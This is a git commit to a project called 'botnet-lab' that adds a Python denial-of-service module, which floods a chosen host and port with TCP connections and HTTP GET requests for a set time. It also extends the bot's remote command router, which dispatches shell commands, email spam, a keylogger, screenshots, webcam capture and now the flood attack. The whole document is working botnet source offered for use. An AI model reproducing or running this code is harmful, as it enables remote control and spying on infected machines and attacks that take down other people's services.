4480eb51ce9d9b953f0cffbe2532a2a72ff61dc8
jpdias <jpdias@live.com.pt>
2015-11-03 19:29:01 +0000

    added DOS capabilities

---
+++ botnet-lab/addons/dos.py
@@ -0,0 +1,25 @@
+import time, socket, os, sys, string, datetime
+ 
+
+message="random"
+
+def dos(host, port, duration, pause):
+	finish_time = datetime.datetime.now() + datetime.timedelta(minutes=int(duration))
+	while datetime.datetime.now() < finish_time:
+		attack(host,port)
+		#time.sleep(int(pause))
+	else:
+		return "Success"
+		
+def attack(host,port):
+	ip = socket.gethostbyname( host )
+	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+		ddos.connect((host, int(port)))
+		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+		ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, int(port)) )
+		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+	except socket.error, msg:
+		return "Connection Failed"
+	ddos.close()
+ 	return True
--- botnet-lab/router.py
+++ botnet-lab/router.py
@@ -3,15 +3,23 @@ import addons
 
 def distribute(messageSent):
 	if messageSent.find ( 'cmd' ) != -1:
+		#cmd->shell_command
 		return addons.shell.shell(messageSent.split('->')[1])
 	elif messageSent.find ( 'spam' ) != -1:
+		#spam->url_list_of_emails-url_msg_email
 		return addons.spam.spam(messageSent.split('->')[1].split('-')[0],messageSent.split('->')[1].split('-')[1])
 	elif messageSent.find ( 'keylogger' ) != -1:
-		return addons.keylogger.keylogger_win(messageSent.split('->')[1])
-	elif messageSent.find("screenshot") != -1:
+		#keylogger->num_of_keys
+		return addons.keylogger.keylogger(messageSent.split('->')[1])
+	elif messageSent.find( 'screenshot' ) != -1:
+		#screenshot
 		return addons.screenshot.screenshot()
-	elif messageSent.find("webcam") != -1:
+	elif messageSent.find( 'webcam' ) != -1:
+		#webcam
 		return addons.webcam.webcam()
+	elif messageSent.find( 'dos' ) != -1:
+		#dos->127.0.0.1:80:minutes:sleep(seconds)
+		return addons.dos.dos(messageSent.split('->')[1].split(':')[0], messageSent.split('->')[1].split(':')[1], messageSent.split('->')[1].split(':')[2], messageSent.split('->')[1].split(':')[3])
 	else:
 		return "404 - Request not found"
 	
